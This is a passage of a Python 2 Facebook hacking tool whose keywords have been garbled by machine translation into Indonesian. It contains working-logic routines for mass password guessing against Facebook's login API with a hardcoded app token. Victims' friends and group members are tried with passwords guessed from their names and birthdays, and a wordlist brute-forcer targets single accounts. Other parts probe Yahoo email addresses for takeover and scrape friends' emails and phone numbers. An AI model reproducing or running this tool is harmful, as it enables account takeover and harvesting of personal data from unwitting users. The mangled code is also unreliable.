        idlist  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mFile ID   \ x1b [1; 91m: \ x1b [1; 97m' )
        kata  sandi =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m' )
        coba :
            file  =  open ( idlist , 'r' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            untuk  x  di  kisaran ( 40 ):
                zedd  =  threading . Utas ( target = scrak , args = ())
                Zedd . mulai ()
                utas . tambahkan ( zedd )

            untuk  zedd  di  utas :
                Zedd . bergabung dengan ()

        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] File tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_hack ()


def  scrak ():
     kembali global
    global  berhasil
     cekpoint global
     gagal global
    global yang  up
    coba :
        buka  =  open ( idlist , 'r' )
        up  =  buka . baca (). split ()
        saat  mengajukan :
            username  =  file . readline (). strip ()
            url  =  'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  nama  +  '& locale = en_US & password ='  +  sandi batasan  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 '
            data  =  urllib . urlopen ( url )
            mpsh  =  json . memuat ( data )
            jika  kembali  ==  len ( atas ):
                istirahat
            jika  'access_token'  di  mpsh :
                bisa  =  terbuka ( 'Berhasil.txt' , 'w' )
                bisa . tulis ( nama pengguna  +  '|'  +  passw  +  ' \ n ' )
                bisa . tutup ()
                berhasil . tambahkan ( ' \ x1b [1; 97m [ \ x1b [1; 92m \ xe2 \ x9c \ x93 \ x1b [1; 97m]'  +  nama pengguna  +  '|'  + kata  sandi )
                kembali  + =  1
            lain :
                jika  'www.facebook.com'  di  mpsh [ 'error_msg' ]:
                    cek  =  terbuka ( 'Cekpoint.txt' , 'w' )
                    cek . tulis ( nama pengguna  +  '|'  +  passw  +  ' \ n ' )
                    cek . tutup ()
                    cekpoint . tambahkan ( ' \ x1b [1; 97m [ \ x1b [1; 93m \ xe2 \ x9c \ x9a \ x1b [1; 97m]'  +  nama pengguna  +  '|'  + kata  sandi )
                    kembali  + =  1
                lain :
                    gagal . tambahkan ( nama pengguna )
                    kembali  + =  1
            sys . stdout . tulis ( ' \ r \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCrack     \ x1b [1; 91m: \ x1b [1; 97m '  +  str ( kembali ) +  ' \ x1b [1; 96m> \ x1b [1; 97m '  +  str ( len ( atas )) +  ' => \ x1b [1; 92mLive \ x1b [1; 91m: \ x1b [ 1; 96m '  + str ( len ( berhasil )) +  ' \ x1b [1; 97m => \ x1b [1; 93mPeriksa \ x1b [1; 91m: \ x1b [1; 96m'  +  str ( len ( cekpoint )))
            sys . stdout . flush ()

    kecuali  IOError :
        cetak  ' \ n \ x1b [1; 91m [!] Sambungan sibuk'
        waktu . tidur ( 0,01 )
    kecuali  permintaan . pengecualian . ConnectionError :
        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'


def  hasil ():
    mencetak
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    untuk  b  in  berhasil :
        cetak  b

    untuk  c  dalam  cekpoint :
        cetak  c

    mencetak
    cetak  ' \ x1b [31m [x] Gagal \ x1b [1; 97m ->'  +  str ( len ( gagal ))
    keluar ()


def  super ():
     toket global
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Retak dari Teman
    cetak  '║-> \ x1b [1; 37; 40m2. Retak dari Grup '
    cetak  '║-> \ x1b [1; 37; 40m3. Retak dari File '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali '
    cetak  ' \ x1b [1; 37; 40m║'
    pilih_super ()


def  pilih_super ():
    peak  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  puncak  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        pilih_super ()
    lain :
        jika  puncak  ==  '1' :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            jalan ( ' \ x1b [1; 91m [+] \ x1b [1; 92mMengambil id Teman \ x1b [1; 97m ...' )
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token='  +  toket )
            z  =  json . memuat ( r . teks )
            untuk  s  in  z [ 'data' ]:
                id . append ( s [ 'id' ])

        lain :
            jika  puncak  ==  '2' :
                os . sistem ( 'jelas' )
                cetak  logo
                mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                idg  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID Grup    \ x1b [1; 91m: \ x1b [1; 97m' )
                coba :
                    r  =  permintaan . dapatkan ( 'https://graph.facebook.com/group/?id='  +  idg  +  '& access_token ='  +  toket )
                    asw  =  json . memuat ( r . teks )
                    cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName grup \ x1b [1; 91m: \ x1b [1; 97m'  +  asw [ 'name' ]
                kecuali  KeyError :
                    cetak  ' \ x1b [1; 91m [!] Grup tidak ditemukan'
                    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                    super ()

                re  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idg  +  '/ members? bidang = nama, id & batas = 999999999 & access_token ='  +  toket )
                s  =  json . memuat ( ulang . teks )
                untuk  i  di  s [ 'data' ]:
                    id . tambahkan ( i [ 'id' ])
                    
            lain :
                jika  puncak  ==  '3' :
                    os . sistem ( 'jelas' )
                    cetak  logo
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                    coba :
                        idlist  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mFile ID   \ x1b [1; 91m: \ x1b [1; 97m' )
                        untuk  baris  di  terbuka ( idlist , 'r' ). readlines ():
                        	id . tambahkan ( baris . strip ())
                    kecuali  IOError :
                        cetak  ' \ x1b [1; 91m [!] File tidak ditemukan'
                        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                        super ()

                lain :
                    jika  puncak  ==  '0' :
                        menu_hack ()
                    lain :
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  puncak  +  ' \ x1b [1; 91mTidak ada'
                        pilih_super ()
    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mTotal ID \ x1b [1; 91m: \ x1b [1; 97m'  +  str ( len ( id ))
    jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...' )
    titik  = [ '. ' , ' .. ' , ' ... ' ]
    untuk  o  di  titik :
        cetak  ' \ r \ r \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCrack \ x1b [1; 97m'  +  o ,
        sys . stdout . flush ()
        waktu . tidur ( 0,01 )

    mencetak
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '

    def  main ( arg ):
        pengguna  =  arg
        coba :
                a  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  user  +  '/? access_token ='  +  toket )
                b  =  json . beban ( a . teks )
                pass1  =  b [ 'first_name' ] +  '123'
                data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  pengguna  +  '& locale = en_US & password ='  +  pass1  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                q  =  json . memuat ( data )
                jika  'access_token'  di  q :
                    cetak  ' \ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass1  +  ' -> '  +  b [ ' name ' ]
                lain :
                    jika  'www.facebook.com'  di  q [ 'error_msg' ]:
                        cetak  ' \ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass1  +  ' -> '  +  b [ ' name ' ]
                    lain :
                            pass2  =  b [ 'firs_name' ] +  '12345'
                            data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  pengguna  +  '& locale = en_US & password ='  +  pass2  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                            q  =  json . memuat ( data )
                            jika  'access_token'  di  q :
                                cetak  ' \ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass2  +  ' -> '  +  b [ ' name ' ]
                            lain :
                                jika  'www.facebook.com'  di  q [ 'error_msg' ]:
                                    cetak  ' \ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass2  +  ' -> '  + [ ' name ' ]
                                lain :
                                        pass3  =  b [ 'last_name' ] +  '123'
                                        data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  pengguna  +  '& locale = en_US & password ='  +  pass3  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                                        q  =  json . memuat ( data )
                                        jika  'access_token'  di  q :
                                            cetak  ' \ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass3  +  ' -> '  +  b [ ' name ' ]
                                        lain :
                                            jika  'www.facebook.com'  di  q [ 'error_msg' ]:
                                                cetak  ' \ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass3  +  ' -> '  +  b [ ' name ' ]
                                            lain :
						    pass4  =  b [ 'last_name' ] +  '12345'
                                                    data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  pengguna  +  '& locale = en_US & password ='  +  pass4  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                                                    q  =  json . memuat ( data )
                                                    jika  'access_token'  di  q :
                                                        cetak  ' \ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass4  +  ' -> '  +  b [ ' name ' ]
                				    lain :
                                                        jika  'www.facebook.com'  di  q [ 'error_msg' ]:
                                                            cetak  ' \ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass4  +  ' -> '  +  b [ ' name ' ]
                    					lain :
                                                                ulang tahun  =  b [ 'ulang tahun' ]
                                                                pass5  =  ulang tahun . ganti ( '/' , '' )
                                                                data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  pengguna  +  '& locale = en_US & password ='  +  pass5  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                                                                q  =  json . memuat ( data )
                                                                jika  'access_token'  di  q :
                                                                    cetak  ' \ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass5  +  ' -> '  +  b [ ' name ' ]
                                                                lain :
                                                                    jika  'www.facebook.com'  di  q [ 'error_msg' ]:
                                                                        cetak  ' \ x1b [1; 97m [ \ x1b [1; 93m [+] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass5  +  ' -> '  +  b [ ' name ' ]
                                                                    lain :
                                                                            pass6  = ( 'sayang' )
                                                                            data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  pengguna  +  '& locale = en_US & password ='  +  pass6  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                                                                            q  =  json . memuat ( data )
                                                                            jika  'access_token'  di  q :
                                                                                cetak  ' \ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass6  +  ' -> '  +  b [ ' name ' ]
                                                                            lain :
                                                                                jika  'www.facebook.com'  di  q [ 'error_msg' ]:
                                                                                    cetak  ' \ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m'  +  pengguna  +  '| '  +  pass6  +  ' -> '  +  b [ ' name ' ]

        kecuali :
            lulus

    p  =  ThreadPool ( 30 )
    hal . peta ( utama , id )
    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mSelesai'
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
    super ()


def  brute ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,5 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  '╔'  +  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        coba :
            email  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID \ x1b [1; 97m / \ x1b [1; 92mEmail \ x1b [1; 97m / \ x1b [1; 92mHp \ x1b [1; ; 97mTarget \ x1b [1; 91m: \ x1b [1; 97m ' )
            passw  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mWordlist \ x1b [1; 97mext (list.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            total  =  terbuka (kata sandi , 'r' )
            total  =  total . readlines ()
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mTarget \ x1b [1; 91m: \ x1b [1; 97m'  +  email
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mTotal \ x1b [1; 96m'  +  str ( len ( total )) +  ' \ x1b [1; 92mPassword'
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            sandi  =  open ( passw , 'r' )
            untuk  pw  dalam  sandi :
                coba :
                    pw  =  pw . ganti ( ' \ n ' , '' )
                    sys . stdout . tulis ( ' \ r \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCoba \ x1b [1; 97m'  +  pw )
                    sys . stdout . flush ()
                    data  =  permintaan . mendapatkan ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  email  +  '& locale = en_US & password ='  +  pw  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                    mpsh  =  json . memuat ( data . teks )
                    jika  'access_token'  di  mpsh :
                        dapat  =  open ( 'Brute.txt' , 'w' )
                        bisa . tulis ( email  +  '|'  +  pw  +  ' \ n ' )
                        bisa . tutup ()
                        cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 91m: \ x1b [1; 97m'  +  email
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m'  +  pw
                        keluar ()
                    lain :
                        jika  'www.facebook.com'  di  mpsh [ 'error_msg' ]:
                            ceks  =  terbuka ( 'Brutecekpoint.txt' , 'w' )
                            ceks . tulis ( email  +  '|'  +  pw  +  ' \ n ' )
                            ceks . tutup ()
                            cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                            cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 91m: \ x1b [1; 97m'  +  email
                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m'  +  pw
                            keluar ()
                kecuali  permintaan . pengecualian . ConnectionError :
                    cetak  ' \ x1b [1; 91m [!] Kesalahan Koneksi'
                    waktu . tidur ( 1 )

        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] File tidak ditemukan ...'
            cetak  ' \ n \ x1b [1; 91m [!] \ x1b [1; 92mKemungkinan kamu tidak memiliki daftar kata'
            tanyaw ()


def  tanyaw ():
    why  =  raw_input ( ' \ x1b [1; 91m [?] \ x1b [1; 92mKamu ingin membuat daftar kata? \ x1b [1; 92m [y / t] \ x1b [1; 91m: \ x1b [1; 97m' )
    jika  mengapa  ==  '' :
        cetak  ' \ x1b [1; 91m [!] Mohon Pilih \ x1b [1; 97m (y / t)'
        tanyaw ()
    lain :
        jika  mengapa  ==  'y' :
            daftar kata ()
        lain :
            jika  mengapa  ==  'Y' :
                daftar kata ()
            lain :
                jika  mengapa  ==  't' :
                    menu_hack ()
                lain :
                    jika  mengapa  ==  'T' :
                        menu_hack ()
                    lain :
                        cetak  ' \ x1b [1; 91m [!] Mohon Pilih \ x1b [1; 97m (y / t)'
                        tanyaw ()


def  menu_yahoo ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Dari teman'
    cetak  '║-> \ x1b [1; 37; 40m2. Dari File '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    yahoo_pilih ()


def  yahoo_pilih ():
    go  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  pergi  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        yahoo_pilih ()
    lain :
        jika  pergi  ==  '1' :
            yahoofriends ()
        lain :
            jika  pergi  ==  '2' :
                yahoolist ()
            lain :
                jika  pergi  ==  '0' :
                    menu_hack ()
                lain :
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  buka  +  ' \ x1b [1; 91mTidak Ditemukan'
                    yahoo_pilih ()


def  yahoofriends ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token Tidak Ada'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    mpsh  = []
    jml  =  0
    jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...' )
    teman  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token='  +  toket )
    kimak  =  json . memuat ( teman . teks )
    save  =  open ( 'MailVuln.txt' , 'w' )
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    untuk  w  di  kimak [ 'data' ]:
        jml  + =  1
        mpsh . tambahkan ( jml )
        id  =  w [ 'id' ]
        nama  =  w [ 'name' ]
        links  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  id  +  '? access_token ='  +  toket )
        z  =  json . memuat ( tautan . teks )
        coba :
            mail  =  z [ 'email' ]
            yahoo  =  ulang . kompilasi ( '@. *' )
            otw  =  yahoo . cari ( mail ). grup ()
            if  'yahoo.com'  dalam  otw :
                br . buka ( 'https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com' )
                br . _factory . is_html  =  Benar
                br . select_form ( nr = 0 )
                br [ 'username' ] =  email
                klik  =  br . kirim (). baca ()
                jok  =  re . kompilasi ( '"messages.ERROR_INVALID_USERNAME">. *' )
                coba :
                    pek  =  jok . cari ( klik ). grup ()
                kecuali :
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 91m'  +  mail  +  ' \ x1b [1; 97m [ \ x1b [ 1; 92m '  +  vulnot  +  ' \ x1b [1; 97m] '
                    terus

                jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
                    simpan . tulis ( email  +  ' \ n ' )
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                    cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName   \ x1b [1; 91m: \ x1b [1; 97m'  +  nama
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mID     \ x1b [1; 91m: \ x1b [1; 97m'  +  id
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m'  +  mail  +  '[ \ x1b [1; 92m'  +  vuln  +  ' \ x1b [1; 97m]'
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                lain :
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 91m'  +  mail  +  ' \ x1b [1; 97m [ \ x1b [ 1; 92m '  +  vulnot  +  ' \ x1b [1; 97m] '
        kecuali  KeyError :
            lulus

    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mSelesai'
    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97m MailVuln.txt'
    simpan . tutup ()
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
    menu_yahoo ()


def  yahoolist ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        files  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mFile \ x1b [1; 91m: \ x1b [1; 97m' )
        coba :
            total  =  terbuka ( file , 'r' )
            mail  =  total . readlines ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] File tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_yahoo ()

    mpsh  = []
    jml  =  0
    jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
    save  =  open ( 'MailVuln.txt' , 'w' )
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  ' \ x1b [1; 91m [?] \ x1b [1; 97mStatus \ x1b [1; 91m:   \ x1b [1; 97mRed [ \ x1b [1; 92m'  +  vulnot  +  ' \ x1b [1; 97m] Hijau [ \ x1b [1; 92m '  +  vuln  +  ' \ x1b [1; 97m] '
    mencetak
    mail  =  open ( file , 'r' ). readlines ()
    untuk  pw  dalam  surat :
        mail  =  pw . ganti ( ' \ n ' , '' )
        jml  + =  1
        mpsh . tambahkan ( jml )
        yahoo  =  ulang . kompilasi ( '@. *' )
        otw  =  yahoo . cari ( mail ). grup ()
        if  'yahoo.com'  dalam  otw :
            br . buka ( 'https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com' )
            br . _factory . is_html  =  Benar
            br . select_form ( nr = 0 )
            br [ 'username' ] =  email
            klik  =  br . kirim (). baca ()
            jok  =  re . kompilasi ( '"messages.ERROR_INVALID_USERNAME">. *' )
            coba :
                pek  =  jok . cari ( klik ). grup ()
            kecuali :
                cetak  ' \ x1b [1; 91m'  +  mail
                terus

            jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
                simpan . tulis ( email  +  ' \ n ' )
                cetak  ' \ x1b [1; 92m'  +  mail
            lain :
                cetak  ' \ x1b [1; 91m'  +  mail

    cetak  ' \ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97m MailVuln.txt'
    simpan . tutup ()
    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
    menu_yahoo ()


def  grab ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Dapatkan ID Dari Teman
    cetak  '║-> \ x1b [1; 37; 40m2. Dapatkan ID Teman Dari Teman
    cetak  '║-> \ x1b [1; 37; 40m3. Dapatkan ID Dari GRUP '
    cetak  '║-> \ x1b [1; 37; 40m4. Dapatkan Email Teman '
    cetak  '║-> \ x1b [1; 37; 40m5. Dapatkan Email Teman Dari Teman
    cetak  '║-> \ x1b [1; 37; 40m6. Dapatkan Telepon Dari Teman
    cetak  '║-> \ x1b [1; 37; 40m7. Dapatkan Teman \' s Telepon Dari Teman
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    grab_pilih ()


def  grab_pilih ():
    cuih  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  cuih  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        grab_pilih ()
    lain :
        jika  cuih  ==  '1' :
            id_friends ()
        lain :
            jika  cuih  ==  '2' :
                idfrom_friends ()
            lain :
                jika  cuih  ==  '3' :
                    id_member_grup ()
                lain :
                    if  cuih  ==  '4' :
                        email ()
                    lain :
                        jika  cuih  ==  '5' :
                            emailfrom_friends ()
                        lain :
                            jika  cuih  ==  '6' :
                                nomor_hp ()
                            lain :
                                jika  cuih  ==  '7' :
                                    hpfrom_friends ()
                                lain :
                                    jika  cuih  ==  '0' :
                                        menu_hack ()
                                    lain :
                                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  cuih  +  ' \ x1b [1; 91 tidak ditemukan'
                                        grab_pilih ()


def  id_friends ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )

        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token='  +  toket )
            z  =  json . memuat ( r . teks )
            save_id  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            bz  =  buka ( save_id , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  ah  di  z [ 'data' ]:
